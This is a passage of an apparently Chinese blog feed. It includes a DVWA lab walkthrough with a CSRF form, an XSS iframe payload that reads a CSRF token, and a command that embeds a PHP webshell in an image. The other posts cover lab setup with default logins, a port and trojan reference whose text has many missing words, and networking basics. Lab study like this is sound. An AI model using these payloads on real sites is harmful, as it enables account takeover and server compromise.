class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password_conf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_token&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Change&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Change&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然而，该网页应该是部署在自己推出的服务器上的，用户所在网页是<code>http://localhost/DVWA/vulnerabilities/csrf/</code>，至此，上述不符合同源策略，故攻击思路不成立</p><p>那究竟怎样才能拿到token呢，那就只能让服务器爆出token，利用xss<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;&lt;/iframe&gt;</code>爆出token</p><p>（未成功）</p><h2 id="File-Inclusion-2"><a href="#File-Inclusion-2" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p><img src="https://img-blog.csdnimg.cn/20210308232241155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">这个级别要求page后面必须是file*或者include.php否则就报错<br>利用file协议打开本地文件，本地文件即在服务器下挂个一句话木马，那么则需要先配合文件上传，然后再包含连接蚁剑(可以文件上传了何必再包含 手动狗头) 其实不是，文件上传漏洞在high级别下已经不能友好的放*.php了<br>那么如何才能挂进一句话呢 看下一条</p><h2 id="File-Upload（图片马）"><a href="#File-Upload（图片马）" class="headerlink" title="File Upload（图片马）"></a>File Upload（图片马）</h2><p>先代码审计：<br><img src="https://img-blog.csdnimg.cn/20210309160727372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">首先，<code>basename()</code>函数返回路径中的文件名部分，<code>strrpos()</code>获取文件名中最后一个<code>.</code>后面的所有字符串(也就是获取后缀名的操作了)，<code>substr()</code>返回文件名中的后缀名(即strrpos截取到的内容) 以此期望过滤后缀名(jpg jpeg png通过)，然后再使用<code>getimagesize()</code>函数测定这是不是一张图片</p><blockquote><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p></blockquote><p>那么以上操作基本不能绕过上传其他类型的文件了，下面介绍图片马的制作：<br>方法一：一个图片，一个一句话木马，使用cmd的copy拼接<code>copy 1.jpg/b + xiaoma.php/a attack.jpg</code>/a表示一个ASCII 文本文件 /b表示一个二进位文件<br>方法二：直接用记事本的方式打开图片，并且直接在乱码最后插入一句话代码即可。</p><h2 id="SQL-Injection-2"><a href="#SQL-Injection-2" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h2 id="SQL-Injection-Blind-2"><a href="#SQL-Injection-Blind-2" class="headerlink" title="SQL Injection (Blind)"></a>SQL Injection (Blind)</h2><h2 id="XSS-2"><a href="#XSS-2" class="headerlink" title="XSS"></a>XSS</h2>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>靶场搭建问题</title>
    <link href="/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/"/>
    <url>/2020/12/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>平台：DVWA sqli-labs upload-labs xss-labs xxe-labs ssrf-labs bwapp</p><h1 id="SQLi-LABS"><a href="#SQLi-LABS" class="headerlink" title="SQLi-LABS"></a>SQLi-LABS</h1><p>搭建出现的问题，由于PHPstudy的版本原因，搭建出现问题，需要更改数据库名，更改面积大，直接虚拟机开低版本搭建<br>学长语：直接解压sqli-labs到www根目录下就行了啊<br>我…还真是，上图<br><img src="https://img-blog.csdnimg.cn/2020112408582051.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201124102250936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>注意：需要更改sqli-labs-master\sql-connections下的db-creds.inc，设置登录密码。</p><h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><img src="https://img-blog.csdnimg.cn/20201206145227918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_16,color_FFFFFF,t_70"><br><code>Ⅰ需要修改当前php版本里的php.ini配置文件 更改allow_url_include = off 为On ==（吐了，大写的O）== 而且要重启php服务 Ⅱ绑定域名，进行本地DNS更新，网上查找www.DVWA.com的密钥</code><br>网站初次登入密码:admin/password</p><h1 id="BWAPP"><a href="#BWAPP" class="headerlink" title="BWAPP"></a>BWAPP</h1><p>进入bwapp里admin，更改settings更改密码<br>登录网站后出现<code>Connection failed: Unknown database &#39;bWAPP&#39;</code><br>进入localhost/bwap/install.php,点击here<br>网站初次登入密码：bee/bug</p>]]></content>
    
    
    <categories>
      
      <category>debug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见端口及其服务</title>
    <link href="/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/"/>
    <url>/2020/12/04/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>  0<br>  Reserved<br>  通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效 ，当你试图使用通常的闭合 连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。<br>  1<br>  tcpmux<br>  这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如 IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p><p>  7<br>  Echo<br>  能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。</p><p>  19<br>  Character Generator<br>  这是一种仅仅发送字符的 。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen 器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个 广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p><p>  21<br>  FTP<br>  FTP 器所开放的 ，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP 器的方法。这些 器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的 。</p><p>  22<br>  Ssh<br>  PcAnywhere建立的TCP和这一 的连接可能是为了寻找ssh。这一 有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p><p>  23<br>  Telnet<br>  远程登录，入侵者在搜索远程登录UNIX的 。大多数情况下扫描这一 是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个 。</p><p>  25<br>  SMTP<br>  SMTP 器所开放的 ，用于发送邮件。入侵者寻找SMTP 器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL 器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个 。</p><p>  31<br>  MSG Authentication<br>  木马Master Paradise、Hackers Paradise开放此 。</p><p>  42<br>  WINS Replication<br>  WINS复制</p><p>  53<br>  Domain Name Server（DNS）<br>  DNS 器所开放的 ，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此防火墙常常过滤或记录此 。</p><p>  67<br>  Bootstrap Protocol Server<br>  通过DSL和Cable modem的防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP 器请求一个地址。HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68 广播请求配置， 器向67 广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p><p>  69<br>  Trival File Transfer<br>  许多 器与bootp一起提供这项 ，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何 文件。它们也可用于系统写入文件。</p><p>  79<br>  Finger Server<br>  入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p><p>  80<br>  HTTP<br>  用于网页浏览。木马Executor开放此 。</p><p>  99<br>  Metagram Relay<br>  后门程序ncx99开放此 。</p><p>  102<br>  Message transfer agent(MTA)-X.400 over TCP/IP<br>  消息传输代理。</p><p>  109<br>  Post Office Protocol -Version3<br>  POP3 器开放此 ，用于接收邮件，客户端访问 器端的邮件 。POP3 有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p><p>  110<br>  SUN公司的RPC 所有<br>  常见RPC 有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p><p>  113<br>  Authentication Service<br>  这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种 可以获得许多计算机的信息。但是它可作为许多 的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等 。通常如果有许多客户通过防火墙访问这些 ，将会看到许多这个 的连接请求。记住，如果阻断这个 客户端会感觉到在防火墙另一边与E-MAIL 器的缓慢连接。许多防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p><p>  119<br>  Network News Transfer Protocol<br>  NEWS新闻组传输协议，承载USENET通信。这个 的连接通常是人们在寻找USENET 器。多数ISP限制，只有他们的客户才能访问他们的新闻组 器。打开新闻组 器将允许发/读任何人的帖子，访问被限制的新闻组 器，匿名发帖或发送SPAM。</p><p>  135<br>  Location Service<br>  Microsoft在这个 运行DCE RPC end-point mapper为它的DCOM 。这与UNIX 111 的功能很相似。使用DCOM和RPC的 利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到 的位置。HACKER扫描计算机的这个 是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个 。</p><p>  137、138、139<br>  NETBIOS Name Service<br>  其中137、138是UDP ，当通过网上邻居传输文件时用这个 。而139  通过这个 进入的连接试图获得NetBIOS/SMB 。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。</p><p>  143<br>  Interim Mail Access Protocol v2<br>  和POP3的安全问题一样，许多IMAP 器存在有缓冲区溢出漏洞。记住 一种LINUX蠕虫（admv0rm）会通过这个 繁殖，因此许多这个 的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一 还被用于IMAP2，但并不流行。</p><p>  161<br>  SNMP<br>  SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p><p>  177<br>  X Display Manager Control Protocol<br>  许多入侵者通过它访问X-windows操作台，它同时需要打开6000 。</p><p>  389<br>  LDAP、ILS<br>  轻型目录访问协议和NetMeeting Internet Locator Server共用这一 。</p><p>  443<br>  Https<br>  网页浏览 ，能提供加密和通过安全 传输的另一种HTTP。</p><p>  456<br>  [NULL]<br>  木马HACKERS PARADISE开放此 。</p><p>  513<br>  Login,remote login<br>  是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p><p>  544<br>  [NULL]<br>  kerberos kshell</p><p>  548<br>  Macintosh,File Services(AFP/IP)<br>  Macintosh,文件 。</p><p>  553<br>  CORBA IIOP （UDP）<br>  使用cable modem、DSL或VLAN将会看到这个 的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p><p>  555<br>  DSF<br>  木马PhAse1.0、Stealth Spy、IniKiller开放此 。</p><p>  568<br>  Membership DPA<br>  成员资格 DPA。</p><p>  569<br>  Membership MSN<br>  成员资格 MSN。</p><p>  635<br>  mountd<br>  Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个 的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个 ）。记住mountd可运行于任何 （到底是哪个 ，需要在 111做portmap查询），只是Linux默认 是635，就像NFS通常运行于2049 。</p><p>  636<br>  LDAP<br>  SSL（Secure Sockets layer）</p><p>  666<br>  Doom Id Software<br>  木马Attack FTP、Satanz Backdoor开放此 </p><p>  993<br>  IMAP<br>  SSL（Secure Sockets layer）</p><p>  1001、1011<br>  [NULL]<br>  木马Silencer、WebEx开放1001 。木马Doly Trojan开放1011 。</p><p>  1024<br>  Reserved<br>  它是动态 的开始，许多程序并不在乎用哪个 连接网络，它们请求系统为它们分配下一个闲置 。基于这一点分配从 1024开始。这就是说第一个向系统发出请求的会分配到1024 。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024 。还有SQL session也用此 和5000 。</p><p>  1025、1033<br>  1025 network blackjack 1033 [NULL]<br>  木马netspy开放这2个 。</p><p>  1080<br>  SOCKS<br>  这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于防火墙外部的攻击穿过防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。<br>  1170<br>  [NULL]<br>  木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此 。</p><p>  1234、1243、6711、6776<br>  [NULL]<br>  木马SubSeven2.0、Ultors Trojan开放1234、6776 。木马SubSeven1.0/1.9开放1243、6711、6776 。</p><p>  1245<br>  [NULL]<br>  木马Vodoo开放此 。</p><p>  1433<br>  SQL<br>  Microsoft的SQL 开放的 。</p><p>  1492<br>  stone-design-1<br>  木马FTP99CMP开放此 。</p><p>  1500<br>  RPC client fixed port session queries<br>  RPC客户固定 会话查询</p><p>  1503<br>  NetMeeting T.120<br>  NetMeeting T.120</p><p>  1524<br>  ingress<br>  许多攻击脚本将安装一个后门SHELL于这个 ，尤其是针对SUN系统中Sendmail和RPC 漏洞的脚本。如果刚安装了防火墙就看到在这个 上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个 ，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。</p><p>  1600<br>  issd<br>  木马Shivka-Burka开放此 。</p><p>  1720<br>  NetMeeting<br>  NetMeeting H.233 call Setup。</p><p>  1731<br>  NetMeeting Audio Call Control<br>  NetMeeting音频调用控制。</p><p>  1807<br>  [NULL]<br>  木马SpySender开放此 。</p><p>  1981<br>  [NULL]<br>  木马ShockRave开放此 。</p><p>  1999<br>  cisco identification port<br>  木马BackDoor开放此 。</p><p>  2000<br>  [NULL]<br>  木马GirlFriend 1.3、Millenium 1.0开放此 。</p><p>  2001<br>  [NULL]<br>  木马Millenium 1.0、Trojan Cow开放此 。</p><p>  2023<br>  xinuexpansion 4<br>  木马Pass Ripper开放此 。</p><p>  2049<br>  NFS<br>  NFS程序常运行于这个 。通常需要访问Portmapper查询这个 运行于哪个 。</p><p>  2115<br>  [NULL]<br>  木马Bugs开放此 。</p><p>  2140、3150<br>  [NULL]<br>  木马Deep Throat 1.0/3.0开放此 。</p><p>  2500<br>  RPC client using a fixed port session replication<br>  应用固定 会话复制的RPC客户</p><p>  2583<br>  [NULL]<br>  木马Wincrash 2.0开放此 。</p><p>  2801<br>  [NULL]<br>  木马Phineas Phucker开放此 。</p><p>  3024、4092<br>  [NULL]<br>  木马WinCrash开放此 。</p><p>  3128<br>  squid<br>  这是squid HTTP代理 器的默认 。攻击者扫描这个 是为了搜寻一个代理 器而匿名访问Internet。也会看到搜索其他代理 器的 8000、8001、8080、8888。扫描这个 的另一个原因是用户正在进入聊天室。其他用户也会检验这个 以确定用户的机器是否支持代理。</p><p>  3129<br>  [NULL]<br>  木马Master Paradise开放此 。</p><p>  3150<br>  [NULL]<br>  木马The Invasor开放此 。</p><p>  3210、4321<br>  [NULL]<br>  木马SchoolBus开放此 </p><p> 3306<br>  [NULL]<br>  mysql</p><p>  3333<br>  dec-notes<br>  木马Prosiak开放此 </p><p>  3389<br>  超级终端<br>  WINDOWS 2000终端开放此 。</p><p>  3700<br>  [NULL]<br>  木马Portal of Doom开放此 </p><p>  3996、4060<br>  [NULL]<br>  木马RemoteAnything开放此 </p><p>  4000<br>  QQ客户端<br>  腾讯QQ客户端开放此 。</p><p>  4092<br>  [NULL]<br>  木马WinCrash开放此 。</p><p>  4590<br>  [NULL]<br>  木马ICQTrojan开放此 。</p><p>  5000、5001、5321、50505<br>  [NULL]<br>  木马blazer5开放5000 。木马Sockets de Troie开放5000、5001、5321、50505 。</p><p>  5400、5401、5402<br>  [NULL]<br>  木马Blade Runner开放此 。</p><p>  5550<br>  [NULL]<br>  木马xtcp开放此 。</p><p>  5569<br>  [NULL]<br>  木马Robo-Hack开放此 。</p><p>  5632<br>  pcAnywere<br>  有时会看到很多这个 的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种 的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含 22的UDP数据包。</p><p>  5742<br>  [NULL]<br>  木马WinCrash1.03开放此 。</p><p>  6267<br>  [NULL]<br>  木马广外女生开放此 。</p><p>  6400<br>  [NULL]<br>  木马The tHing开放此 。</p><p>  6670、6671<br>  [NULL]<br>  木马Deep Throat开放6670 。而Deep Throat 3.0开放6671 。</p><p>  6883<br>  [NULL]<br>  木马DeltaSource开放此 。</p><p>  6969<br>  [NULL]<br>  木马Gatecrasher、Priority开放此 。</p><p>  6970<br>  RealAudio<br>  RealAudio客户将从 器的6970-7170的UDP 接收音频数据流。这是由TCP-7070 外向控制连接设置的。</p><p>  7000<br>  [NULL]<br>  木马Remote Grab开放此 。</p><p>  7300、7301、7306、7307、7308<br>  [NULL]<br>  木马NetMonitor开放此 。另外NetSpy1.0也开放7306 。</p><p>  7323<br>  [NULL]<br>  Sygate 器端。</p><p>  7626<br>  [NULL]<br>  木马Giscier开放此 。</p><p>  7789<br>  [NULL]<br>  木马ICKiller开放此 。</p><p>  8000<br>  OICQ<br>  腾讯QQ 器端开放此 。</p><p>  8010<br>  Wingate<br>  Wingate代理开放此 。</p><p>  8080<br>  代理<br>  WWW代理开放此 。</p><p>  9400、9401、9402<br>  [NULL]<br>  木马Incommand 1.0开放此 。</p><p>  9872、9873、9874、9875、10067、10167<br>  [NULL]<br>  木马Portal of Doom开放此 。</p><p>  9989<br>  [NULL]<br>  木马iNi-Killer开放此 。</p><p>  11000<br>  [NULL]<br>  木马SennaSpy开放此 。</p><p>  11223<br>  [NULL]<br>  木马Progenic trojan开放此 。</p><p>  12076、61466<br>  [NULL]<br>  木马Telecommando开放此 。<br>page]<br>  12223<br>  [NULL]<br>  木马Hack’99 KeyLogger开放此 。</p><p>  12345、12346<br>  [NULL]<br>  木马NetBus1.60/1.70、GabanBus开放此 。</p><p>  12361<br>  [NULL]<br>  木马Whack-a-mole开放此 。</p><p>  13223<br>  PowWow<br>  PowWow是Tribal Voice的聊天程序。它允许用户在此 打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP 等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个 的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p><p>  16969<br>  [NULL]<br>  木马Priority开放此 。</p><p>  17027<br>  Conducent<br>  这是一个外向连接。这是由于公司内部有人安装了带有Conducent”adbot”的共享软件。Conducent”adbot”是为共享软件显示广告 的。使用这种 的一种流行的软件是Pkware。</p><p>  19191<br>  [NULL]<br>  木马蓝色火焰开放此 。</p><p>  20000、20001<br>  [NULL]<br>  木马Millennium开放此 。</p><p>  20034<br>  [NULL]<br>  木马NetBus Pro开放此 。</p><p>  21554<br>  [NULL]<br>  木马GirlFriend开放此 。</p><p>  22222<br>  [NULL]<br>  木马Prosiak开放此 。</p><p>  23456<br>  [NULL]<br>  木马Evil FTP、Ugly FTP开放此 。</p><p>  26274、47262<br>  [NULL]<br>  木马Delta开放此 。</p><p>  27374<br>  [NULL]<br>  木马Subseven 2.1开放此 。</p><p>  30100<br>  [NULL]<br>  木马NetSphere开放此 。</p><p>  30303<br>  [NULL]<br>  木马Socket23开放此 。</p><p>  30999<br>  [NULL]<br>  木马Kuang开放此 。</p><p>  31337、31338<br>  [NULL]<br>  木马BO(Back Orifice)开放此 。另外木马DeepBO也开放31338 。</p><p>  31339<br>  [NULL]<br>  木马NetSpy DK开放此 。</p><p>  31666<br>  [NULL]<br>  木马BOWhack开放此 。</p><p>  33333<br>  [NULL]<br>  木马Prosiak开放此 。</p><p>  34324<br>  [NULL]<br>  木马Tiny Telnet Server、BigGluck、TN开放此 。</p><p>  40412<br>  [NULL]<br>  木马The Spy开放此 。</p><p>  40421、40422、40423、40426、<br>  [NULL]<br>  木马Masters Paradise开放此 。</p><p>  43210、54321<br>  [NULL]<br>  木马SchoolBus 1.0/2.0开放此 。</p><p>  44445<br>  [NULL]<br>  木马Happypig开放此 。</p><p>  50766<br>  [NULL]<br>  木马Fore开放此 。</p><p>  53001<br>  [NULL]<br>  木马Remote Windows Shutdown开放此 。</p><p>  65000<br>  [NULL]<br>  木马Devil 1.03开放此 。</p><p>  88<br>  Kerberos krb5。另外TCP的88 也是这个用途。</p><p>  137<br>  SQL Named Pipes encryption over other protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS NetBT名称 )和Wins Proxy都用这个 。</p><p>  161<br>  Simple Network Management Protocol(SMTP)（简单网络管理协议）。</p><p>  162<br>  SNMP Trap（SNMP陷阱）</p><p>  445<br>  Common Internet File System(CIFS)（公共Internet文件系统）</p><p>  464<br>  Kerberos kpasswd(v5)。另外TCP的464 也是这个用途。</p><p>  500<br>  Internet Key Exchange(IKE)（Internet密钥交换）</p><p>  1645、1812<br>  Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(远程认证拨号用户 )</p><p>  1646、1813<br>  RADIUS accounting(Routing and Remote Access)(RADIUS记帐（路由和远程访问）)</p><p>  1701<br>  Layer Two Tunneling Protocol(L2TP)(第2层隧道协议)</p><p>  1801、3527<br>  Microsoft Message Queue Server(Microsoft消息队列 器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。</p><p>  2504<br>  Network Load Balancing(网络平衡负荷)</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络基础</title>
    <link href="/2020/12/04/%E8%AE%A1%E7%BD%91/"/>
    <url>/2020/12/04/%E8%AE%A1%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="一、网络模型"><a href="#一、网络模型" class="headerlink" title="一、网络模型"></a>一、网络模型</h1><p>不同划分方式下的网络体系模型<br><img src="https://img-blog.csdnimg.cn/20201203132129490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20201203133326473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20201203224110893.gif"></p><hr><h1 id="二、各层介绍"><a href="#二、各层介绍" class="headerlink" title="二、各层介绍"></a>二、各层介绍</h1><p>1）<strong>物理层（Physical Layer）</strong></p><p>激活、维持、关闭通信端点之间的机械特性、电气特性、功能特性以及过程特性。该层为上层协议提供了一个传输数据的可靠的物理媒体。简单的说，物理层确保原始的数据可在各种物理媒体上传输。物理层记住两个重要的设备名称，中继器（Repeater，也叫放大器）和集线器。</p><p>2）<strong>数据链路层（Data Link Layer）</strong></p><p>数据链路层在物理层提供的服务的基础上向网络层提供服务，其最基本的服务是将源自网络层来的数据可靠地传输到相邻节点的目标机网络层。为达到这一目的，数据链路必须具备一系列相应的功能，主要有：如何将数据组合成数据块，在数据链路层中称这种数据块为帧（frame），帧是数据链路层的传送单位；如何控制帧在物理信道上的传输，包括如何处理传输差错，如何调节发送速率以使与接收方相匹配；以及在两个网络实体之间提供数据链路通路的建立、维持和释放的管理。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。</p><ul><li>数据链路层为网络层提供可靠的数据传输；</li><li>基本数据单位为帧；</li><li>主要的协议：<strong>以太网协议</strong>；</li><li>两个重要设备名称：网桥和交换机。</li></ul><p>3）<strong>网络层（Network Layer）</strong></p><p>网络层的目的是实现两个端系统之间的数据透明传送，具体功能包括寻址和路由选择、连接的建立、保持和终止等。它提供的服务使传输层不需要了解网络中的数据传输和交换技术。如果您想用尽量少的词来记住网络层，那就是“路径选择、路由及逻辑寻址”。</p><p>网络层中涉及众多的协议，其中包括最重要的协议，也是TCP/IP的核心协议——IP协议。IP协议非常简单，仅仅提供不可靠、无连接的传送服务。IP协议的主要功能有：无连接数据报传输、数据报路由选择和差错控制。与IP协议配套使用实现其功能的还有地址解析协议ARP、逆地址解析协议RARP、因特网报文协议ICMP、因特网组管理协议IGMP。</p><ul><li>网络层负责对子网间的数据包进行路由选择。此外，网络层还可以实现拥塞控制、网际互连等功能；</li><li>基本数据单位为IP数据报；</li><li>包含的主要协议：<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IP协议（Internet Protocol，因特网互联协议）<span class="hljs-comment">;</span><br><br>ICMP协议（Internet Control Message Protocol，因特网控制报文协议）<span class="hljs-comment">;</span><br><br>ARP协议（Address Resolution Protocol，地址解析协议）<span class="hljs-comment">;</span><br><br>RARP协议（Reverse Address Resolution Protocol，逆地址解析协议）。<br></code></pre></td></tr></table></figure></li><li>重要的设备：路由器。</li></ul><p>4）<strong>传输层（Transport Layer）</strong></p><p>第一个端到端，即主机到主机的层次。传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输。此外，传输层还要处理端到端的差错控制和流量控制问题。</p><p>传输层的任务是根据通信子网的特性，最佳的利用网络资源，为两个端系统的会话层之间，提供建立、维护和取消传输连接的功能，负责端到端的可靠数据传输。在这一层，信息传送的协议数据单元称为段或报文。</p><p>网络层只是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到相应的端口。</p><ul><li><p>传输层负责将上层数据分段并提供端到端的、可靠的或不可靠的传输以及端到端的差错控制和流量控制问题；</p></li><li><p>包含的主要协议：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">TCP协议（Transmission Control Protocol，传输控制协议）<br>UDP协议（<span class="hljs-keyword">User</span> <span class="hljs-title">Datagram</span> 